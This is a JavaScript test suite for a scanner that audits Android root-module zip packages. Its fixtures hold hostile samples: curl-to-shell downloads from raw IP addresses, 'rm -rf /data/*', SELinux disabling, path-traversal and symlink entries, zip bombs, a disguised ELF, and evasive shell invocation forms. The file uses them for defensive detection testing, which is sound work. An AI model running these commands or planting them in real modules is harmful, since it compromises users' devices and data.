  const p = writeZip('traversal.zip', [
    { name: 'module.prop', content: CLEAN_PROP },
    { name: 'customize.sh', content: CLEAN_SH },
    { name: '../escape.sh', content: '#!/system/bin/sh\n' },
  ]);
  const r = scanZip(p, { declaredId: 'cool_mod', declaredVersion: 'v1.0', changeType: 'first' });
  assert.equal(r.riskLevel, 'high');
  assert.equal(r.decision.needsHumanReview, true);
  assert.ok(r.findings.some((f) => f.ruleId === 'STRUCT_UNSAFE_PATH' && f.file === '../escape.sh'));
});

test('端到端：符号链接条目判 high（脚本本身一行危险模式都没有也照样拦）', () => {
  const p = writeZip('symlink.zip', [
    { name: 'module.prop', content: CLEAN_PROP },
    { name: 'customize.sh', content: CLEAN_SH },
    { name: 'link/hosts', content: '/data/data/com.xxx/databases/x.db', extAttr: 0xa1ff0000 },
  ]);
  const r = scanZip(p, { declaredId: 'cool_mod', declaredVersion: 'v1.0', changeType: 'first' });
  assert.equal(r.riskLevel, 'high');
  assert.ok(r.findings.some((f) => f.ruleId === 'STRUCT_SYMLINK'));
  assert.deepEqual(r.structure.symlinks, ['link/hosts']);
});

test('端到端：重名条目判 high —— 扫描器看到的那份未必是被解压的那份', () => {
  const p = writeZip('dup.zip', [
    { name: 'module.prop', content: CLEAN_PROP },
    { name: 'service.sh', content: '#!/system/bin/sh\nexit 0\n' },
    { name: 'service.sh', content: '#!/system/bin/sh\nrm -rf /data/*\n' },
  ]);
  const r = scanZip(p, { declaredId: 'cool_mod', declaredVersion: 'v1.0', changeType: 'first' });
  assert.ok(r.findings.some((f) => f.ruleId === 'STRUCT_DUPLICATE_NAME'), JSON.stringify(r.findings.map((f) => f.ruleId)));
  assert.equal(r.riskLevel, 'high');
  assert.deepEqual(r.structure.duplicateNames, ['service.sh']);
});

test('端到端：META-INF 安装期入口里的恶意代码会被扫到（此前这类文件一行都没读）', () => {
  assert.ok(FLASH_ENTRY_POINTS.includes('META-INF/com/google/android/updater-script'));
  const p = writeZip('handler.zip', [
    { name: 'module.prop', content: CLEAN_PROP },
    { name: 'customize.sh', content: CLEAN_SH },
    { name: 'META-INF/com/google/android/updater-script', content: '#!/system/bin/sh\nsetenforce 0\nrm -rf /data/*\n' },
  ]);
  const r = scanZip(p, { declaredId: 'cool_mod', declaredVersion: 'v1.0', changeType: 'first' });
  assert.equal(r.riskLevel, 'high');
  const ids = new Set(r.findings.map((f) => f.ruleId));
  assert.ok(ids.has('SELINUX_DISABLE') && ids.has('RM_RF_MUTABLE'), JSON.stringify([...ids]));
  const hit = r.findings.find((f) => f.ruleId === 'SELINUX_DISABLE');
  assert.equal(hit.file, 'META-INF/com/google/android/updater-script');
  assert.equal(r.inventory.handlers.length, 1, '入口文件要在清单里单独成类，便于人工定位');
});

test('端到端：.lua / .js / .prop 里的危险模式同样纳入行级规则', () => {
  const p = writeZip('langs.zip', [
    { name: 'module.prop', content: CLEAN_PROP },
    { name: 'service.lua', content: 'os.execute("setenforce 0")\n' },
    { name: 'hook.js', content: 'var s = "curl http://45.77.12.9/x | sh";\n' },
    { name: 'system.prop', content: 'ro.x.url=http://payload.xyz/c\n' },
  ]);
  const r = scanZip(p, { declaredId: 'cool_mod', declaredVersion: 'v1.0', changeType: 'first' });
  const files = new Set(r.findings.map((f) => f.file));
  for (const need of ['service.lua', 'hook.js', 'system.prop']) {
    assert.ok(files.has(need), `${need} 应产生发现；实际 ${[...files].join(',')}`);
  }
  assert.ok(SEVERITY_ORDER[r.riskLevel] >= SEVERITY_ORDER.medium);
});

test('端到端：把 ELF 改名成 config.js 也只能落到「二进制」，不会当成脚本放过', () => {
  const elf = Buffer.concat([Buffer.from('\x7fELF\x02\x01\x01\x00', 'latin1'), Buffer.alloc(200, 0)]);
  const p = writeZip('disguise.zip', [
    { name: 'module.prop', content: CLEAN_PROP },
    { name: 'customize.sh', content: CLEAN_SH },
    { name: 'config.js', content: elf },
  ]);
  const r = scanZip(p, { declaredId: 'cool_mod', declaredVersion: 'v1.0', changeType: 'first' });
  assert.notEqual(r.riskLevel, 'low', '二进制负载不应判 low');
  assert.equal(r.decision.needsHumanReview, true);
  assert.ok(r.findings.some((f) => f.ruleId === 'STRUCT_BINARY' && f.file === 'config.js'),
    JSON.stringify(r.findings.map((f) => f.ruleId)));
  assert.deepEqual(r.binaries.map((b) => b.name), ['config.js']);
  assert.ok(!r.scripts.some((s) => s.name === 'config.js'), '机器码不进「全文」一节，否则 PR 评论会被灌满');

  // 评审 fix1-③：上面那句「不进全文」只是因为没人引用才没红 —— 它压根不在扫描面里。
  // 真被 sh 引用时它必须进扫描面（该扫的照扫），但渲染面只许给有界预览：删掉渲染守卫这条就红。
  const p2 = writeZip('disguise-referenced.zip', [
    { name: 'module.prop', content: CLEAN_PROP },
    { name: 'customize.sh', content: '#!/system/bin/sh\nsh $MODDIR/config.js\n' },
    { name: 'config.js', content: elf },
  ]);
  const r2 = scanZip(p2, { declaredId: 'cool_mod', declaredVersion: 'v1.0', changeType: 'first' });
  assert.deepEqual(r2.escalated.map((e) => e.resolvedEntry), ['config.js'], '被引用就要进扫描面');
  const row2 = r2.scripts.find((s) => s.name === 'config.js');
  assert.ok(row2, '升级条目要在人看得见的清单里（F11）');
  assert.equal(row2.nonText, true, '非文本要标出来');
  assert.equal(row2.contentKind, 'non-text-preview', '预览要说明它不是全文');
  const NUL = String.fromCharCode(0);
  assert.ok(!row2.content.includes(NUL), '机器码不进全文 —— 删掉渲染守卫这一句就红');
  assert.ok(row2.content.length < 1000, '必须是有限预览，实际 ' + row2.content.length + ' 字符');
  assert.ok(!renderMarkdown(r2).includes(NUL), 'md 里也不许有 NUL');
  assert.equal(r2.riskLevel, 'high', '改名成 .js 的 ELF 被引用时必须 high');
});

test('端到端：payload 藏在行级规则输入上限之后 ⇒ 记账而不是免检（原「照样命中」用例，见下列注解）', () => {
  const filler = '# 填充行，用于把危险语句推到报告内嵌上限之外\n'.repeat(1 + Math.ceil(MAX_TEXT / 60));
  const body = filler + '\nsetenforce 0\n';
  const p = writeZip('late-payload.zip', [
    { name: 'module.prop', content: CLEAN_PROP },
    { name: 'customize.sh', content: body },
  ]);
  const r = scanZip(p, { declaredId: 'cool_mod', declaredVersion: 'v1.0', changeType: 'first' });
  const big = r.inventory.canonicalScripts.find((s) => s.name === 'customize.sh');
  assert.ok(big.bytes > MAX_TEXT, `样本必须超过内嵌上限，实际 ${big.bytes}`);
  assert.equal(big.truncated, true);
  const sel = r.findings.find((f) => f.ruleId === 'SELINUX_DISABLE');
  // 注解（Task 2.9）：原断言是 `assert.ok(sel, '规则必须跑全文：藏在尾部的 setenforce 不能因为报告截断而漏掉')`
  // —— 它钉的是「行级规则跑全文」这条旧口径，与本轮「单条目字节上限」直接冲突：上限的意义就是
  // 后缀不再逐行判过。现在改成断言「没读到」，而「读到一半 ≠ 干净」由下面那条截断记录兜住。
  assert.ok(!sel, '上限之后的字节没有喂给行级规则（旧期望：必须命中，已随 2.9 的字节上限作废）');
  // 注解（Task 2.9）：原断言是 `assert.ok(sel.line > 1000, '命中的是尾部行')` —— 随上一条一起作废，
  // 换成「这条载荷根本没进规则输入」的可复核证据：实扫字节数必须明显小于原文。
  assert.ok(big.scanBytes <= CAP29 && big.scanBytes > CAP29 - 4,
    `实扫字节必须贴住上限（UTF-8 码点边界最多回退 3 B），实际 ${big.scanBytes} / 上限 ${CAP29}`);
  assert.ok(big.bytes > big.scanBytes * 10, `样本要在上限之外留出一大段，实际 ${big.bytes} B`);
  assert.equal(r.riskLevel, 'medium', '旧期望 high（载荷命中）→ 新期望 medium：等级只能由截断记录撑起来');
  assert.ok(r.findings.some((f) => f.ruleId === 'AUDIT_COVERAGE_TRUNCATED'), '看不全本身也要报，挡住自动放行');
  const cov = r.findings.find((f) => f.ruleId === 'AUDIT_COVERAGE_TRUNCATED');
  assert.equal(cov.file, 'customize.sh', '记录必须指名是哪个条目');
  assert.match(cov.message, /只喂进前/, '记录必须写出实际喂进规则多少字节');
  assert.notEqual(r.decision.action, 'auto-approve', '读到一半永远换不到自动放行');
  assert.match(renderMarkdown(r), /包结构与审核覆盖度/);
  assert.match(renderMarkdown(r), /报告只内嵌前/);
});

// ---------------------------------------------------------------------------
// Task 2.9：内容扫描的字节上限（单条目喂给行级规则的字节数）
//
// 上限常量在这里走**命名空间**取值而不是具名 import：red-first 阶段常量还不存在，
// 具名 import 会让整个文件在加载期就抛（143 条一起红），拿不到「只有新用例红」这个数。
// ---------------------------------------------------------------------------
import * as scanMod29 from './scan.mjs';

const CAP29 = scanMod29.MAX_SCAN_BYTES_PER_ENTRY;
/** 41 B 一行（40 个 ASCII + 换行）的填充：条目总量超上限，但每行都短 ⇒ 行级规则本身线性，测试不被平方级拖住 */
const LINE29 = '# filler line for byte cap 0123456789abcdef\n';
const pad29 = (n) => LINE29.repeat(n);
/** 载荷行放在「上限之前最后一整行」与「上限之后第一整行」用的行号 */
const LINES_BEFORE29 = Math.floor((CAP29 || 24576) / LINE29.length);
const BYTE_AT29 = (n) => n * LINE29.length;

test('T2.9-①：载荷落在上限之内 ⇒ ruleId / 级别 / 行号 / 决策与不设上限时一模一样', () => {
  assert.ok(Number.isFinite(CAP29) && CAP29 > 0, `MAX_SCAN_BYTES_PER_ENTRY 必须是正数，实际 ${CAP29}`);
  // 载荷在第 LINES_BEFORE29+1 行：它的起始字节 BYTE_AT29(LINES_BEFORE29) < 上限，整行也在上限之内。
  const body = pad29(LINES_BEFORE29) + 'setenforce 0\n' + pad29(2000);
  assert.ok(BYTE_AT29(LINES_BEFORE29) + 'setenforce 0\n'.length <= CAP29,
    '夹具必须把载荷整行放在上限之内');
  assert.ok(Buffer.byteLength(body) > CAP29, '夹具必须超过上限，否则测的是另一件事');
  const p = writeZip('cap-early.zip', [
    { name: 'module.prop', content: CLEAN_PROP },
    { name: 'customize.sh', content: body },
  ]);
  const r = scanZip(p, { declaredId: 'cool_mod', declaredVersion: 'v1.0', changeType: 'first' });
  const sel = r.findings.find((f) => f.ruleId === 'SELINUX_DISABLE');
  assert.ok(sel, '上限只许让扫描更早停，不许让上限之内的载荷漏掉');
  assert.equal(sel.severity, 'high', '级别必须与 f79b784 一致');
  assert.equal(sel.file, 'customize.sh');
  assert.equal(sel.line, LINES_BEFORE29 + 1, `行号必须与 f79b784 一致（第 ${sel.line} 行）`);
  assert.equal(sel.snippet, 'setenforce 0');
  assert.equal(r.riskLevel, 'high', '与 f79b784 同判 high');
  assert.equal(r.decision.action, 'block', '与 f79b784 同判 block');
  // 后面的字节确实没读 ⇒ 截断同时记账（两条并存：命中照旧，覆盖度缺口也照实说）
  assert.ok(r.findings.some((f) => f.ruleId === 'AUDIT_COVERAGE_TRUNCATED'),
    '条目超限却没记截断 ⇒ 上限成了「读到一半就算读完」');
});

test('T2.9-②：载荷落在上限之后 ⇒ 记 AUDIT_COVERAGE_TRUNCATED，且绝不是「0 命中 / low / auto-approve」', () => {
  const payloadLine = LINES_BEFORE29 + 2; // 起始字节 = BYTE_AT29(LINES_BEFORE29+1) > CAP29
  assert.ok(BYTE_AT29(payloadLine - 1) > CAP29, '夹具必须把载荷整行放到上限之外');
  const body = pad29(payloadLine - 1) + 'setenforce 0\n' + pad29(2000);
  const p = writeZip('cap-late.zip', [
    { name: 'module.prop', content: CLEAN_PROP },
    { name: 'customize.sh', content: body },
  ]);
  const r = scanZip(p, { declaredId: 'cool_mod', declaredVersion: 'v1.0', changeType: 'first' });
  assert.ok(!r.findings.some((f) => f.ruleId === 'SELINUX_DISABLE'),
    '上限之后的字节确实没喂给行级规则 —— 这条断言是「上限真的生效」的证据');
  const cov = r.findings.filter((f) => f.ruleId === 'AUDIT_COVERAGE_TRUNCATED');
  assert.equal(cov.length, 1, JSON.stringify(cov));
  assert.equal(cov[0].file, 'customize.sh', '必须指名是哪个条目');
  assert.equal(countsTowardRisk(cov[0]), true, '「读不完」必须参与定级，不许是 info');
  assert.ok(SEVERITY_ORDER[cov[0].severity] >= SEVERITY_ORDER.medium, '截断记录的级别不得低于 medium');
  const size = Buffer.byteLength(body);
  assert.match(cov[0].message, new RegExp(String(size)), 'message 要写出原始字节数');
  assert.match(cov[0].message, new RegExp(String(CAP29)), 'message 要写出实际喂进去的字节数');
  assert.match(cov[0].snippet, new RegExp(`${size}.*${CAP29}|${size}`), 'snippet 要带上原始/实扫字节两个数');
  assert.notEqual(r.findings.length, 0, '载荷被上限挡住时，findings 不能归零');
  assert.notEqual(r.riskLevel, 'low', '「读到一半」不等于「干净」');
  assert.notEqual(r.decision.action, 'auto-approve', '上限不许开出一条自动放行的门');
});

test('T2.9 硬边界：任何进入扫描面的条目形状，载荷挪到上限之后都只能换来更严的结论', () => {
  // 「上限只能让扫描更早停」这条不变量的覆盖面：不同桶、不同文件名形状都要拦住。
  // 每个形状都跑两遍 —— 载荷在上限前 / 载荷在上限后 —— 后者必须仍然不是 auto-approve。
  const shapes = [
    ['customize.sh', 'canonicalScripts'],
    ['webroot/helper.js', 'otherScripts'],
    ['sepolicy.rule', 'policyFiles'],
    ['system.prop', 'props'],
    ['META-INF/com/google/android/update-binary', 'handlers'],
  ];
  for (const [name, bucket] of shapes) {
    const late = pad29(LINES_BEFORE29 + 1) + 'setenforce 0\n' + pad29(1500);
    const p = writeZip(`cap-shape-${bucket}.zip`, [
      { name: 'module.prop', content: CLEAN_PROP },
      { name, content: late },
    ]);
    const r = scanZip(p, { declaredId: 'cool_mod', declaredVersion: 'v1.0', changeType: 'first' });
    const rows = r.inventory[bucket] || [];
    assert.ok(rows.some((x) => x.name === name), `${name} 没进扫描面，本条用例测不到它`);
    const cov = r.findings.filter((f) => f.ruleId === 'AUDIT_COVERAGE_TRUNCATED' && f.file === name);
    assert.equal(cov.length, 1, `${name}：超限必须记账，实际 ${JSON.stringify(r.findings.map((f) => f.ruleId))}`);
    assert.notEqual(r.riskLevel, 'low', `${name}：只读到前缀就判 low 等于「读到一半 = 干净」`);
    assert.notEqual(r.decision.action, 'auto-approve', `${name}：上限之后不许通向自动放行`);
  }
  // module.prop 走的是 propEntry 那条独立通道（不在扫描面上时也要记账）
  const bigProp = CLEAN_PROP + pad29(LINES_BEFORE29 + 1) + 'setenforce 0\n' + pad29(1500);
  const p2 = writeZip('cap-shape-module.prop.zip', [{ name: 'module.prop', content: bigProp }]);
  const r2 = scanZip(p2, { declaredId: 'cool_mod', declaredVersion: 'v1.0', changeType: 'first' });
  assert.ok(r2.findings.some((f) => f.ruleId === 'AUDIT_COVERAGE_TRUNCATED' && f.file === 'module.prop'),
    'module.prop 走 propFindings 通道时同样要记截断');
  assert.notEqual(r2.decision.action, 'auto-approve');
});

test('T2.9：上限就是报告里写的那个阈值，且它低于报告内嵌上限才有意义', () => {
  assert.ok(CAP29 < MAX_TEXT,
    `单条目上限必须低于内嵌上限 MAX_TEXT=${MAX_TEXT}，否则单行超长样本还在闸外（实测 512 KB 单行 ≈ 数分钟）`);
  const body = pad29(1200);
  const p = writeZip('cap-limits.zip', [
    { name: 'module.prop', content: CLEAN_PROP },
    { name: 'customize.sh', content: body },
  ]);
  const r = scanZip(p, { declaredId: 'cool_mod', declaredVersion: 'v1.0', changeType: 'first' });
  assert.equal(r.structure.limits.MAX_SCAN_BYTES_PER_ENTRY, CAP29,
    '报告里的阈值必须就是这次真正生效的那个（与 MAX_ENTRY_UNCOMPRESSED 同一口径）');
  const md = renderMarkdown(r);
  assert.match(md, /行级规则的输入上限/, '报告要写明行级规则的输入上限');
  assert.doesNotMatch(md, /行级规则跑的仍是全文/, '上限之后这句话就是假话');
});

test('T2.9：截断点退到 UTF-8 码点边界 —— 半截多字节字符不许变成 U+FFFD 混进规则输入', () => {
  // 1 个 ASCII + 若干 3 字节汉字 ⇒ 上限落点正卡在某个汉字的中间， naive 的 slice 会切出残缺序列。
  const body = 'a' + '中文载荷'.repeat(1 + Math.ceil(CAP29 / 12));
  assert.ok(Buffer.byteLength(body) > CAP29, '夹具必须超过上限');
  const p = writeZip('cap-utf8.zip', [
    { name: 'module.prop', content: CLEAN_PROP },
    { name: 'customize.sh', content: body },
  ]);
  const { files } = readZip(p);
  const f = files.find((x) => x.name === 'customize.sh');
  assert.equal(f.scanCapped, true);
  assert.ok(f.scanBytes <= CAP29, `实扫字节 ${f.scanBytes} 必须 ≤ 上限 ${CAP29}`);
  assert.equal(Buffer.byteLength(f.scanText, 'utf8'), f.scanBytes, '记账的字节数必须就是喂进去的字节数');
  assert.ok(!f.scanText.includes('\uFFFD'), `喂进去的前缀里有残缺码点：${JSON.stringify(f.scanText.slice(-8))}`);
  assert.ok(f.content.length > f.scanText.length, '全文仍然要留着（报告/产物靠它，上限只管行级规则的输入）');
});

test('T2.9：没超限的条目一个字节都不许多记 —— 上限不产生噪声也不改变结论', () => {
  const body = pad29(50);
  assert.ok(Buffer.byteLength(body) < CAP29, '夹具必须在上限之内');
  const p = writeZip('cap-small.zip', [
    { name: 'module.prop', content: CLEAN_PROP },
    { name: 'customize.sh', content: body },
    { name: 'service.sh', content: '#!/system/bin/sh\nexit 0\n' },
  ]);
  const r = scanZip(p, { declaredId: 'cool_mod', declaredVersion: 'v1.0', changeType: 'first' });
  assert.equal(r.findings.length, 0, JSON.stringify(r.findings));
  assert.equal(r.riskLevel, 'low');
  assert.equal(r.decision.action, 'auto-approve', '干净且没超限的小模块照旧自动放行 —— 上限不许收紧这一格');
  const row = r.inventory.canonicalScripts.find((s) => s.name === 'customize.sh');
  assert.equal(row.scanCapped, false, '未超限的条目不许标成截断');
  assert.equal(row.scanBytes, Buffer.byteLength(body), '未超限时实扫字节数就是条目大小');
});

test('T2.9 方向②续：被引用升级进来的大条目同样受上限约束，且记账指到那个条目', () => {
  // Task 2.7（fix10-P11）改了这里的前提：改名成 .dat 的**文本**载荷现在本来就在 feed 上
  // （cls.others 进内容扫描），不再「因引用被拉进来」，于是它不再是这条用例的对象。
  // 升级条目要真有，载荷就得在 feed 之外 —— 换成「魔数头伪装成 .dat」：classify 把它路由到
  // binaries（那条魔数优先于后缀的分流由本文件的伪装钉子压着），它只能靠 service.sh 的引用进来，
  // 上限与截断记账才有对象可管。夹具尺寸不变（同一个 pad29 形状，仍然远超上限）。
  const payload = elfWith(pad29(LINES_BEFORE29 + 1) + 'setenforce 0\n' + pad29(1500));
  const p = writeZip('cap-escalated.zip', [
    { name: 'module.prop', content: CLEAN_PROP },
    { name: 'service.sh', content: '#!/system/bin/sh\nsh /data/adb/modules/cool_mod/stage.dat\n' },
    { name: 'stage.dat', content: payload },
  ]);
  const r = scanZip(p, { declaredId: 'cool_mod', declaredVersion: 'v1.0', changeType: 'first' });
  assert.equal(payload.length > CAP29, true, `夹具必须超过上限（实际 ${payload.length} / ${CAP29}）`);
  assert.ok(r.binaries.some((b) => b.name === 'stage.dat'),
    '夹具前提：它走 binaries，不在 feed 上，只能被引用拉进来：' + JSON.stringify(r.binaries));
  assert.deepEqual(r.escalated.map((e) => e.resolvedEntry), ['stage.dat'], '夹具前提：stage.dat 被升级进扫描面');
  assert.ok(!r.findings.some((f) => f.ruleId === 'SELINUX_DISABLE'), '上限之后的载荷不该被读到（上限生效）');
  const cov = r.findings.find((f) => f.ruleId === 'AUDIT_COVERAGE_TRUNCATED' && f.file === 'stage.dat');
  assert.ok(cov, '升级进来的条目超限也必须记账', JSON.stringify(r.findings.map((f) => f.ruleId)));
  assert.equal(SEVERITY_ORDER[cov.severity] >= SEVERITY_ORDER.medium, true);
  assert.match(cov.snippet, new RegExp(String(payload.length)), '记账要写出条目原大小');
  assert.match(cov.message, new RegExp(String(CAP29)), '记账要写出实扫字节数（上限）');
  // 记账不能只落在 finding 上：清单里那一行要同时给出「多大」和「实扫多少」，人才复核得了。
  const row = r.inventory.escalated.find((e) => e.name === 'stage.dat');
  assert.ok(row, '升级条目要在文件清单里（评审 F11）');
  assert.equal(row.bytes, payload.length, '清单行的原大小就是条目字节数');
  assert.equal(row.scanBytes, CAP29, `实扫字节必须正好砍在上限上，实际 ${row.scanBytes}`);
  assert.equal(row.scanCapped, true, '被上限砍过就要标成截断，不许安静');
  assert.notEqual(r.decision.action, 'auto-approve');
  assert.notEqual(r.riskLevel, 'low');
});

test('端到端：声明解压 1 GB 的条目按 zip bomb 拦下', () => {
  const p = writeZip('bomb.zip', [
    { name: 'module.prop', content: CLEAN_PROP },
    { name: 'z', content: 'x', method: 0, declaredOrig: 1024 * 1024 * 1024 },
  ]);
  const r = scanZip(p, { declaredId: 'cool_mod', declaredVersion: 'v1.0', changeType: 'first' });
  const ids = new Set(r.findings.map((f) => f.ruleId));
  assert.ok(ids.has('STRUCT_ZIP_BOMB'), JSON.stringify([...ids]));
  assert.ok(ids.has('STRUCT_RATIO'), JSON.stringify([...ids]));
  assert.equal(r.riskLevel, 'high');
  assert.equal(r.decision.needsHumanReview, true);
  assert.ok(r.structure.totalUncompressed >= 1024 * 1024 * 1024, String(r.structure.totalUncompressed));
});

test('端到端：主动挡下的超大条目不能再交给系统 unzip 试一遍', () => {
  // 唯一的条目超限 -> files 为空。若不加 deliberate 判断，这里会去调外部 unzip，
  // 等于把刚拦住的超大条目重新解压一次（runner 当场被打满的就是这一步）。
  const p = writeZip('over-limit.zip', [
    { name: 'blob', content: Buffer.alloc(2 * 1024 * 1024, 0x41) },
  ]);
  const r = scanZip(p, { changeType: 'first', maxEntryBytes: 64 * 1024 });
  assert.equal(r.reader, 'builtin', '不许回退');
  assert.equal(r.unread.length, 1);
  assert.equal(r.unread[0].overLimit, true);
  assert.ok(r.findings.some((f) => f.ruleId === 'STRUCT_UNREADABLE'));
  assert.notEqual(r.riskLevel, 'low');
});

test('端到端：声明说谎（说 10 B 实际 2 MB）时，解压硬上限是唯一还管用的闸', () => {
  const big = Buffer.alloc(2 * 1024 * 1024, 0x41);
  const p = writeZip('lying.zip', [
    { name: 'module.prop', content: CLEAN_PROP },
    { name: 'blob', content: big, declaredOrig: 10 },
  ]);
  // 先证明：不做隔离时这个条目本来能正常读出来，问题只在超上限
  const wide = scanZip(p, { declaredId: 'cool_mod', declaredVersion: 'v1.0', changeType: 'first' });
  assert.ok(wide.files === undefined || wide.unread.length === 0, JSON.stringify(wide.unread));

  const tight = scanZip(p, { declaredId: 'cool_mod', declaredVersion: 'v1.0', changeType: 'first', maxEntryBytes: 64 * 1024 });
  assert.equal(tight.reader, 'builtin');
  assert.equal(tight.unread.length, 1, JSON.stringify(tight.unread));
  assert.equal(tight.unread[0].name, 'blob');
  assert.equal(tight.unread[0].overLimit, true, '必须归因为「超上限」，而不是笼统的解压失败');
  assert.match(tight.unread[0].reason, /上限/);
  assert.ok(tight.findings.some((f) => f.ruleId === 'STRUCT_UNREADABLE'));
  assert.notEqual(tight.riskLevel, 'low', '读不到不等于干净');
  assert.equal(tight.structure.limits.MAX_ENTRY_UNCOMPRESSED, 64 * 1024, '报告里写的上限必须就是这次生效的上限');
});

test('端到端：系统 unzip 回退通道看不到结构属性，因此不予自动放行', () => {
  // 直接验回退路径的定级语义：reader=unzip 时必须自带 AUDIT_COVERAGE_METADATA。
  // 构造一个内置解析器读不出的文件（EOCD 被截断）来触发回退，
  // 若本机没有 unzip 就跳过 —— 这条断言依赖外部命令，不该因此把测试变成不稳定测试。
  const dir = mkdtempSync(join(tmpdir(), 'modaudit-'));
  const p = join(dir, 'broken.zip');
  const good = buildZip([{ name: 'module.prop', content: CLEAN_PROP }]);
  writeFileSync(p, good.subarray(0, good.length - 10)); // 破坏 EOCD
  let r;
  try {
    r = scanZip(p, { changeType: 'first' });
  } catch (err) {
    assert.match(String(err.message), /unzip/, '回退失败只可能是本机没有 unzip');
    return;
  }
  assert.equal(r.reader, 'unzip');
  assert.ok(r.findings.some((f) => f.ruleId === 'AUDIT_COVERAGE_METADATA'), JSON.stringify(r.findings.map((f) => f.ruleId)));
  assert.equal(r.decision.needsHumanReview, true);
});

test('readZip 带出 entries 元数据与 head，供结构/二进制判断使用', () => {
  const p = writeZip('meta.zip', [
    { name: 'module.prop', content: CLEAN_PROP },
    { name: 'link', content: '/system/bin/sh', extAttr: 0xa1ff0000 },
  ]);
  const { files, entries, unread } = readZip(p);
  assert.equal(unread.length, 0);
  assert.equal(entries.length, 2);
  assert.equal(entries.find((e) => e.name === 'link').isSymlink, true);
  assert.equal(entries.find((e) => e.name === 'module.prop').isSymlink, false);
  assert.deepEqual([...files.find((f) => f.name === 'module.prop').head.subarray(0, 3)], [0x69, 0x64, 0x3d], 'head 是解压后的字节，不是压缩流');
});

// ---------------------------------------------------------------------------
// ⑦ 载荷间接执行 —— 被引用但未纳入扫描的包内条目（T1）
// ---------------------------------------------------------------------------

test('EXEC_BUNDLED_FILE：脚本执行包内非扫描面条目 → high，且那个条目被拉进内容扫描', async () => {
  const zip = makeModuleZip({ id: 'eval.t1', files: [
    ['service.sh', '#!/system/bin/sh\nsh /data/adb/modules/eval.t1/stage.dat\n'],
    ['stage.dat', 'curl http://45.77.1.2/x.sh | sh\n'],
  ]});
  const r = await scanToReport(zip, { changeType: 'first' });
  const ids = r.findings.map((f) => f.ruleId);
  assert.ok(ids.includes('EXEC_BUNDLED_FILE'), ids.join(','));
  assert.equal(r.riskLevel, 'high');                      // 之前是 low → auto-approve
  assert.equal(r.decision.action, 'block');
  // 关键：不只是标个链接，被引用的条目真的被扫了
  assert.ok(ids.includes('PIPE_TO_SHELL'), '被引用条目必须按文本再扫一遍');
  const f = r.findings.find((x) => x.ruleId === 'PIPE_TO_SHELL');
  assert.equal(f.file, 'stage.dat');
  // F11：它还得在人看得见的清单里，否则 T5 的 brief 与人工复核都读不到这段内容
  assert.ok(r.scripts.some((s) => s.name === 'stage.dat'), '被升级的条目必须进 report.scripts');
});

test('EXEC_BUNDLED_FILE：引用形态矩阵 —— 检测层要认得全部写法，包括改名机器码与同行复合', () => {
  // 这一条只管「检测」：规则是纯逐行函数，拿不到扫描面，所以它不该替「那个文件是否已被扫过」说话。
  // 「目标已逐行扫过就不报」的撤销判据在 scanZip 里（见下面那条端到端用例）—— 评审 fix1-① 的修法。
  for (const line of [
    // 简报 Step 1 的 6 例
    'sh $MODDIR/x.dat', 'bash ${MODDIR}/payload', '. $MODDIR/lib.sh.bin',
    'busybox sh $MODDIR/x.bin', 'source ${MODPATH}/run.zsh', 'sh "/data/adb/modules/a/payload.bin"',
    // 简报 Step 3 注释点名要认的 3 例
    'sh $TMPMODDIR/stage2.dat', 'sh $MODPATH/bin/payload', 'sh /data/adb/modules/eval.t1/stage.dat',
    // fix1-①：改名成脚本后缀的机器码。后缀不是「已扫过」的证据，所以这里必须命中。
    'sh $MODDIR/payload.js', 'sh $MODDIR/payload.sh', 'sh $MODPATH/late.js',
    'sh $MODDIR/cfg.prop', 'busybox sh ${MODDIR}/hook.lua',
    // fix1-②：同一行不许自我豁免（两个引用一个合法一个恶意，恶意那个必须报）
    'sh $MODDIR/payload.dat && sh $MODDIR/install.sh',
    'sh $MODDIR/install.sh && sh $MODDIR/payload.dat',
    'sh $MODDIR/payload.dat  # 这行只是调用 install.sh 的包装',
    // fix1-④：一律不许豁免的逃逸写法
    'echo hi sh $MODDIR/x.bin', '. $MODDIR/functions', "sh '$MODDIR/lib.dat'",
    'sh${IFS}$MODDIR/x.bin', '$MODDIR/tool.bin', '  "$MODDIR/tool.bin" --help',
    'do_thing || $MODDIR/stage2.bin', 'cd /; sh $MODDIR/x.bin',
    // fix1-⑤：要归一化的形状，先得能被检测
    'sh $MODDIR//x.dat', 'sh $MODDIR/sub/../x.dat', 'sh $MODDIR/sub/./x.dat',
    'sh $MODDIR\\sub\\x.dat', 'sh $MODDIR/X.DAT', 'sh $MODDIR/ghost.dat',
  ]) {
    assert.ok(EXEC_BUNDLED_FILE.scan('service.sh', line).length > 0, line);
  }
  // 不是「执行包内另一个文件」的形状，以及注释行（fix1-④ 的豁免，按本仓 /^\s*#/ 先例）
  for (const line of [
    'sh /system/bin/foo', 'echo $MODPATH/x', 'cp -f busybox $MODPATH/system/xbin/bb',
    'rm -rf $MODDIR/system/app/Foo', 'export PATH=$MODDIR/bin:$PATH',
    '[ -f $MODDIR/data.dat ] && echo ok', 'SKIPUNINSTALL=1', '# sh $MODDIR/tool.bin',
    '  #  sh $MODDIR/tool.bin', '#!/system/bin/sh',
  ]) {
    assert.equal(EXEC_BUNDLED_FILE.scan('service.sh', line).length, 0, line);
  }
});

test('EXEC_BUNDLED_FILE：撤销判据是「它真的在扫描面里」，不是后缀像不像脚本', async () => {
  // 正经模块的常规写法：install.sh 确实被逐行扫过 -> 这条 high 撤掉，别淹没人工队列。
  const ok = makeModuleZip({ id: 'eval.t1ok', files: [
    ['customize.sh', '#!/system/bin/sh\nsh $MODPATH/install.sh\nbash ${MODDIR}/lib.sh\n'],
    ['install.sh', 'echo install\n'],
    ['lib.sh', 'echo lib\n'],
  ]});
  const r1 = await scanToReport(ok, { changeType: 'first' });
  assert.deepEqual(r1.escalated, [], '目标已在扫描面里，不该被当成新条目升级');
  assert.ok(!r1.findings.some((f) => f.ruleId === 'EXEC_BUNDLED_FILE'),
    JSON.stringify(r1.findings.map((f) => f.ruleId)));
  assert.equal(r1.riskLevel, 'low', JSON.stringify(r1.findings));
  // fix8-E 改动此行（原为 'auto-approve'，附言「多文件正经模块不能被这条规则抬成人工队列」）：
  // 上面两条断言已经确认这里确实发生过两次撤销（install.sh、lib.sh 都在扫描面上，那条 high 被撤），
  // 而 E 拍定的就是「撤销过就不许走自动通道」——旧期望与本轮规格直接冲突，按规格改。
  // 撤销本身、等级、findings 内容一字未动，代价只落在决策上。见 task-2.8-report.md「与现有用例的冲突」。
  assert.equal(r1.decision.action, 'request-review', '撤销过两次就不许自动放行（fix8-E）');
